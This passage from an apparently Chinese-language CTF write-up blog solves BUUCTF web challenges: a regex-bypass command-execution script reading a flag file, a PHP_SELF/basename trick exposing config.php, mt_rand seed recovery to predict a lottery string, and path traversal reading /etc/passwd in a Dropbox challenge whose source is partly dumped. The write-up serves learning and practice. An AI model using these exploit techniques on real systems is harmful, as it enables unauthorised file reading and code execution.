class="hljs-number">1000000</span><br>url=<span class="hljs-string">&#x27;http://80acce67-8aec-44ab-9b7c-afddf7295d76.node4.buuoj.cn:81/&#x27;</span><br><br>data=&#123;<br><br>    <span class="hljs-string">&#x27;cmd&#x27;</span>:<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span>+<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>)+<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>&#125;<br>r=requests.post(url=url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span><br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = bin2hex(random_bytes(<span class="hljs-number">64</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (hash_equals(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//php源码</span><br></code></pre></td></tr></table></figure><p><code>&#39;PHP_SELF&#39;</code> 当前执行脚本的文件</p><p>有两点：</p><div class="code-wrapper"><pre><code class="hljs">- 传入guess=随机数secret- 不能检测到config.php</code></pre></div><p>以为是伪随机数，然而并不是，瞅了一眼feng 哥的wp这里有个fuzz的思路没有想到我真的…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;/index.php/config.php/&quot;</span>.chr(<span class="hljs-variable">$i</span>);<br>    <span class="hljs-keyword">if</span>(!check(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;：&quot;</span>.basename(<span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">echo</span> PHP_EOL;<br>    &#125;<br>&#125;  <span class="hljs-comment">//这里对ascii码进行遍历查看哪个字符会绕过basename，实际上basename会去掉文件名开头的非ascii值（ascii为单字节字符，中文是两个字符）所以这里加上中文也可以</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201202035712.png" alt="image-20220120203538604"></p><p>可以看到这里 ascii字符&gt;128之后 全被解析为config.php</p><p>这里由于我不熟悉ascii url编码的表示形式，就自己又写了个脚本 写完发现可以上网查…啥b了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$str</span>=chr(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;Ascii：&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&#x27;     &#x27;</span>.rawurldecode(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;     urlencode：&#x27;</span>.urlencode(chr(<span class="hljs-variable">$i</span>)));<br>        <span class="hljs-keyword">print</span>(PHP_EOL);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201202037849.png" alt="image-20220120203748770"></p><p>也就是%80往后</p><p>于是构建   <code>http://2af286ad-b22b-4f10-9e57-950fc5bf2036.node4.buuoj.cn:81/index.php/config.php/%81?source</code>  即可</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>根据html的ajax代码得知，存在一个check.php，跟进一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>session_start();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=rand(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<br>&#125;<br><br>mt_srand(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$str_long1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$str_show</span> = substr(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br>show_source(<span class="hljs-string">&quot;check.php&quot;</span>);<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">这下总该是伪随机数了吧，伪随机数由它的种子生成，所以我们如果想知道伪随机数就需要知道它的种子是什么</code></pre></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>str1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>str2 = <span class="hljs-string">&#x27;S8i4xgjCk&#x27;</span>       <span class="hljs-comment">#已知的</span><br>str3 = str1[::-<span class="hljs-number">1</span>]<br>length = <span class="hljs-built_in">len</span>(str2)<br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str1)):<br>        <span class="hljs-keyword">if</span> str2[i] == str1[j]:<br>            res += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str1) - <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-comment">#54 54 0 61 34 34 0 61 8 8 0 61 30 30 0 61 23 23 0 61 6 6 0 61 9 9 0 61 38 38 0 61 10 10 0 61</span><br></code></pre></td></tr></table></figure><p>然后用这个种子去生成随机数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201202106632.png" alt="image-20220120210636554"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    mt_srand(<span class="hljs-number">823202674</span>);<br>    <span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>    <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>        <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$str_long1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>替换一下mt_srand内的值，然后在框框里提交这个值，成功getFlag</p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>这里注册，登录账号之后，发现下载自己上传的文件，那么可不可在下载的过程中修改文件名参数从而达到任意文件读取的功能</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221134759.png" alt="image-20220122113354577"></p><p>是可以的  <code>../../../../../etc/passwd</code></p><p>于是构建形如 <code>../../index.php</code> 对其他页面进行下载</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br>ini_set(<span class="hljs-string">&quot;open_basedir&quot;</span>, getcwd() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br>chdir(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;open(<span class="hljs-variable">$filename</span>) &amp;&amp; stristr(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    Header(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    Header(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;close();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;execute();<br>        <span class="hljs-variable">$stmt</span>-&gt;store_result();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user_exist(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = sha1(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;execute();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;user_exist(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = sha1(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;execute();<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = scandir(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = array_search(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = array_search(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File();<br>            <span class="hljs-variable">$file</span>-&gt;open(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            array_push(<span class="hljs-keyword">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;results[<span 